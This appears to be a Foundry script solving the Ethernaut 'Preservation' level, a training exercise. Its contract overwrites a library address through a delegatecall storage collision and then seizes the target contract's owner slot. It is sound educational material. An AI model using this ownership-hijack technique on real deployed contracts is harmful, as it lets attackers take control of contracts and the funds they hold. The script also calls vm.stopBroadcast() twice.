// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {Preservation} from "./Problem.sol";

contract Solution {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function changeOwner(Preservation _preservation) public {
        _preservation.setFirstTime(uint256(address(this)));
        _preservation.setFirstTime(uint256(0));
    }

    function setTime(uint256) public {
        owner = tx.origin;
    }
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        Preservation preservation = Preservation(_instanceAddress);

        vm.startBroadcast();
        Solution solution = new Solution();
        solution.changeOwner(preservation);
        vm.stopBroadcast();

        assert(preservation.owner() == tx.origin);
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("16");
    }
}
